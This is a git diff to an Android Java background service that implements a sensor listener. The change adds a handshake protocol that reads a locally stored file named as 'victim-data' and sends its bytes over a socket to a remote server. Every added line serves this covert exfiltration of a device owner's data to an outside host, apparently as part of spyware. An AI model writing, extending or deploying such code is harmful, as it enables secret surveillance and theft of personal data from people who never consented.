@@ -27,6 +27,7 @@ import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
+import java.io.PrintWriter;
 import java.net.Socket;
 import java.net.UnknownHostException;
 
@@ -111,9 +112,8 @@ public class BackgroundService extends Service implements SensorEventListener {
         Log.d("SOCKET", "TEST");
         try {
             Socket socket = new Socket(serverName, port);
-//            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
+            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
             BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-
 
             String fileName = "5177825794384-victim-data.csv";
             File file = new File(getApplicationContext().getFilesDir().getPath() + "/" + fileName);
@@ -123,10 +123,45 @@ public class BackgroundService extends Service implements SensorEventListener {
             bufferedInputStream.read(byteArray, 0, byteArray.length);
 
             OutputStream sender = socket.getOutputStream();
-            Log.d("Sending", fileName);
 
-            sender.write(byteArray, 0, byteArray.length);
-            sender.flush();
+            // transfer protocol
+            writer.println("FILE");
+            writer.flush();
+            String message = reader.readLine();
+            if(message.equals("File name?")) {
+                Log.d("Server response", message);
+                writer.println(fileName);
+                writer.flush();
+                message = reader.readLine();
+                if (message.equals("File size?")) {
+                    Log.d("Server response", message);
+                    writer.println(file.length());
+                    writer.flush();
+                    message = reader.readLine();
+                    if (message.equals("Waiting for file...")) {
+                        Log.d("Server response", message);
+                        Log.d("Sending", fileName);
+                        sender.write(byteArray, 0, byteArray.length); // TODO replace with writer?
+                        sender.flush();
+                    }else {
+                        Log.e("File size Error", message);
+                    }
+                }else {
+                    Log.e("File name Error", message);
+                }
+
+            }
+            else {
+                Log.e("Server Error", message);
+            }
+
+            // response
+            // TODO send file size
+            // response
+            // TODO send file
+            // response
+
+
 
 
             // response
